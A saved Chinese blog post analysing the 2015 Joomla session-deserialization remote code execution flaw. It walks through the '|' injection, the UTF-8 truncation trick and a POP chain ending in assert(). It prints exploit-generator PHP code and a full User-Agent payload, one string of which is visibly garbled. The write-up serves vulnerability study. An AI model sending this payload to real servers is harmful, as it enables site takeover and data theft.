@@ -1,0 +1,469 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>Joomla远程代码执行漏洞分析（总结） | 离别歌</title>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/styles.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/style.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./Joomla远程代码执行漏洞分析（总结）  离别歌/jquery.min.js"></script>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/code.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/button.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./Joomla远程代码执行漏洞分析（总结）  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;text=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;is_video=false&amp;description=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;title=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html&amp;name=Joomla%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%80%BB%E7%BB%93%EF%BC%89&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">Joomla远程代码执行漏洞分析（总结）</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年12月27日 22:29" itemprop="datePublished">
+                    2015 十二月 27 22:29
+                </time>
+</div>
+<div class="article-tag">
+            阅读：3671
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">反序列化漏洞</a>,
+                
+                <a class="tag-link" href="/tag/joomla">joomla</a>,
+                
+                <a class="tag-link" href="/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">命令执行漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>joomla漏洞出来这么久了，我也于当天在drops发表了这篇文章( <a href="http://drops.wooyun.org/papers/11330"><a href="http://drops.wooyun.org/papers/11330">http://drops.wooyun.org/papers/11330</a></a> )。今天再看，还是有点急促，有些原理上的东西没说清楚。</p>
+<p>我在自己博客里，把这篇文章增加一些原理上的说明，发出来留个底稿。</p>
+<h2 id="session"><a class="toclink" href="#session">漏洞点 —— 反序列化session</a></h2>
+<p>这个漏洞存在于反序列化session的过程中。</p>
+<p>漏洞存在于 libraries/joomla/session/session.php 中，_validate函数，将ua和xff调用set方法设置到了session中（session.client.browser和session.client.forwarded）</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">protected</span> <span class="k">function</span> <span class="nf">_validate</span><span class="p">(</span><span class="nv">$restart</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="o">...</span>
+
+        <span class="c1">// Record proxy forwarded for in the session in case we need it later</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]))</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">'session.client.forwarded'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">]);</span>
+        <span class="p">}</span>
+
+        <span class="o">...</span>
+        <span class="c1">// Check for clients browser</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">'fix_browser'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_security</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]))</span>
+        <span class="p">{</span>
+            <span class="nv">$browser</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'session.client.browser'</span><span class="p">);</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$browser</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">'session.client.browser'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$browser</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="c1">// @todo remove code: $this-&gt;_state = 'error';</span>
+                <span class="c1">// @todo remove code: return false;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> 
+</pre></div>
+<p>最终跟随他们俩进入数据库，session表：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201512/39d01451235948.jpg"><img alt="14501741134471.jpg" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/thum-39d01451235948.jpg"/></a></p>
+<p>正常情况下，不存在任何问题。因为我们控制的只是反序列化对象中的一个字符串，不会触发反序列相关的漏洞。</p>
+<p>但是，因为一个小姿势，导致后面我们可以控制整个反序列化对象。</p>
+<h2 id="_1"><a class="toclink" href="#_1">利用|字符伪造，控制整个反序列化字符串</a></h2>
+<p>首先，我们需要先看看@Ryat老师的pch-013： <a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></a></p>
+<p>和pch-013中的情况类似，joomla也没有采用php自带的session处理机制，而是用多种方式（包括database、memcache等）自己编写了存储session的容器（storage）。</p>
+<p>其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值』，其未正确处理多个竖线的情况。</p>
+<p>那么，我们这里就可以通过注入一个<code>|</code>符号，将它前面的部分全部认为是name，而|后面我就可以插入任意serialize字符串，构造反序列化漏洞了。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201512/16e81451235948.jpg"><img alt="14501748976406.jpg" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/thum-16e81451235948.jpg"/></a></p>
+<p>但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像SQL注入，还有注释符可用。</p>
+<p>但不知各位是否还记得当年wordpress出过的一个XSS( <a href="http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html"><a href="http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</a></a> )，当时就是在插入数据库的时候利用"𝌆"（%F0%9D%8C%86）字符将utf-8的字段截断了。</p>
+<p>这里我们用同样的方法，在session进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。</p>
+<h2 id="_2"><a class="toclink" href="#_2">原理探究：何谓处理多个|不合理</a></h2>
+<p>实际上是php底层对session字符串处理的不合理。</p>
+<p>其实L.N的文章里已经可以看到原理了 <a href="http://bobao.360.cn/learning/detail/2501.html"><a href="http://bobao.360.cn/learning/detail/2501.html">http://bobao.360.cn/learning/detail/2501.html</a></a></p>
+<p>在php5.6.13以前的版本里，php在获取session字符串以后，就开始查找第一个|，然后用这个|将字符串分割成『键名』和『键值』。<br>
+用unserialize解析键值，解析结果作为session。</br></p>
+<p>但如果这个unserialize解析失败，就放弃这次解析。找到下一个|，再根据这个|将字符串分割成两部分，执行同样的操作，直到解析成功。</p>
+<p>所以，这个joomla漏洞的核心内容就是：我们通过𝌆字符， 将原本的session截断了，结果因为长度不对所以第一次解析|失败，才轮到第二次解析我传入的|，最后成功利用。</p>
+<p>所以，构造session出错，是这个漏洞成立的核心。</p>
+<p>所以，我们还能不能想到其他利用方法？</p>
+<p>比如，我们可以用长字符（64k）串截断，来达成类似和𝌆字符截断一样的效果。</p>
+<p>这几天，joomla再次对此漏洞进行了加固： <a href="http://bobao.360.cn/learning/detail/2527.html"><a href="http://bobao.360.cn/learning/detail/2527.html">http://bobao.360.cn/learning/detail/2527.html</a></a> ，处理的很优秀，欣赏这样的态度。</p>
+<h2 id="pop"><a class="toclink" href="#pop">构造POP执行链，执行任意代码</a></h2>
+<p>在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。</p>
+<p>exp构造的执行链，分别利用了如下类：</p>
+<ol>
+<li>JDatabaseDriverMysqli</li>
+<li>SimplePie</li>
+</ol>
+<p>我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnect</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">disconnect</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">// Close the connection.</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="k">as</span> <span class="nv">$h</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="p">));</span>
+            <span class="p">}</span>
+
+            <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+    <span class="p">}</span> 
+</pre></div>
+<p>当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用<code>__destruct</code>，<code>__destruct</code>将会调用<code>disconnect</code>，<code>disconnect</code>里有一处敏感函数：<code>call_user_func_array</code>。</p>
+<p>但很明显，这里的<code>call_user_func_array</code>的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</p>
+<p>于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), 'init']，传入<code>call_user_func_array</code>。</p>
+<p>跟进init方法：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">init</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="c1">// Check absolute bare minimum requirements.</span>
+        <span class="k">if</span> <span class="p">((</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'version_compare'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'4.3.0'</span><span class="p">,</span> <span class="s1">'&lt;'</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'xml'</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">extension_loaded</span><span class="p">(</span><span class="s1">'pcre'</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="o">...</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raw_data</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">multifeed_objects</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+            <span class="nv">$cache</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nv">$parsed_feed_url</span> <span class="o">=</span> <span class="nx">SimplePie_Misc</span><span class="o">::</span><span class="na">parse_url</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">);</span>
+                <span class="c1">// Decide whether to enable caching</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$parsed_feed_url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="nv">$cache</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_class</span><span class="p">,</span> <span class="s1">'create'</span><span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">);</span>
+                <span class="p">}</span> 
+</pre></div>
+<p>很明显，其中这两个call_user_func将是触发代码执行的元凶。</p>
+<p>所以，我将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</p>
+<p>所以，exp是怎么生成的，给出我写的生成代码：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">//header("Content-Type: text/plain");</span>
+<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">JDatabaseDriverMysql</span> <span class="p">{</span>
+
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">"phpinfo();JFactory::getConfig();exit;"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">"assert"</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysql</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
+        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">"init"</span><span class="p">],</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> 
+</pre></div>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201512/46141451235941.jpg"><img alt="14501734764205.jpg" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/thum-46141451235941.jpg"/></a></p>
+<p>将这个代码生成的exp，以前面提到的注入『|』的变换方式，带入前面提到的user-agent中，即可触发代码执行。</p>
+<p>其中，我们需要将<code>char(0)*char(0)</code>替换成\0\0\0，因为在序列化的时候，protected类型变量会被转换成<code>\0*\0name</code>的样式，这个替换在源代码中也可以看到：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\0\0\0'</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'*'</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nv">$result</span><span class="p">);</span> 
+</pre></div>
+<p>构造的时候遇到一点小麻烦，那就是默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201512/58a21451235945.jpg"><img alt="14501735764788.jpg" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/thum-58a21451235945.jpg"/></a></p>
+<p>而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。</p>
+<p>给出我最终构造的POC（既是上诉php代码生成的POC）：</p>
+<div class="codehilite"><pre><span></span><span class="nt">User-Agent</span><span class="o">:</span> <span class="nt">123</span><span class="err">}</span><span class="nt">__test</span><span class="o">|</span><span class="nt">O</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">"JDatabaseDriverMysqli"</span><span class="p">:</span><span class="nd">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"\0\0\0a"</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">"JSimplepieFactory"</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">"\0\0\0disconnectHandlers"</span><span class="o">;</span><span class="nt">a</span><span class="p">:</span><span class="nd">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="p">:</span><span class="mi">2</span><span class="o">:</span><span class="err">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">"SimplePie"</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="err">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"sanitize"</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"JDatabaseDriverMysql"</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">5</span><span class="o">:</span><span class="s2">"cache"</span><span class="o">;</span><span class="nt">b</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">19</span><span class="o">:</span><span class="s2">"cache_name_function"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">6</span><span class="o">:</span><span class="s2">"assert"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">10</span><span class="o">:</span><span class="s2">"javascript"</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">9999</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">8</span><span class="o">:</span><span class="s2">"feed_url"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">37</span><span class="o">:</span><span class="s2">"ρhιτhσπpinfo();JFactory::getConfig();exit;"</span><span class="o">;</span><span class="err">}</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">4</span><span class="o">:</span><span class="s2">"init"</span><span class="o">;</span><span class="err">}}</span><span class="nt">s</span><span class="p">:</span><span class="nd">13</span><span class="o">:</span><span class="s2">"\0\0\0connection"</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="err">}</span><span class="nt">ð</span><span class="err"></span>
+</pre></div>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201512/b3d41451235950.jpg"><img alt="14501837463659.jpg" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/thum-b3d41451235950.jpg"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2364">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Joomla远程代码执行漏洞分析（总结）  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">xxx</a>
+<time datetime="2016年6月16日 17:38" itemprop="datePublished">
+                            2016 六月 16 17:38
+                        </time>
+<a href="javascript:reply_to('2364', 'xxx')">回复</a>
+</p>
